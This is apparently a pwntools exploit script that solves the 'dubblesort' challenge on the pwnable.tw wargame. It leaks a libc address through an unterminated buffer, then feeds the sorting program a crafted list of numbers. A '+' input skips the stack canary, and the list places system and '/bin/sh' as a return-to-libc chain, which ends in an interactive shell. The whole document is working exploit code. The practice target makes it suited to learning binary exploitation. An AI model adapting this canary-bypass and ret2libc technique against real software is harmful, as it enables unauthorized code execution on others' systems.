from pwn import *

#r = process('./dubblesort', env={'LD_PRELOAD':'./libc_32.so.6'})
r = remote('chall.pwnable.tw', 10101)

libc_32 = ELF('./libc_32.so.6')

#===================== leak libc

r.recvuntil(':')
r.send('aaaa'*7)
s = r.recvuntil(',').strip(',')

addrloc = 6 + 28
leakaddr = u32(s[addrloc:addrloc+4])
print hex(leakaddr)

offset = 0xf76e5244 - 0xf7537000
libc = leakaddr - offset
print hex(libc)

system = libc + libc_32.symbols['system']
sh = libc + libc_32.search('/bin/sh').next()

#===================== sort

r.recvuntil(':')
r.sendline('40')    # 24 + canary + 7 + ret + 7

for i in range(24):
    r.recvuntil(':')
    r.sendline(str(i))

r.recvuntil(':')
r.sendline('+')

for i in range(7):
    r.recvuntil(':')
    r.sendline(str(libc))

r.recvuntil(':')
r.sendline(str(system))

for i in range(7):
    r.recvuntil(':')
    r.sendline(str(sh))

r.interactive()
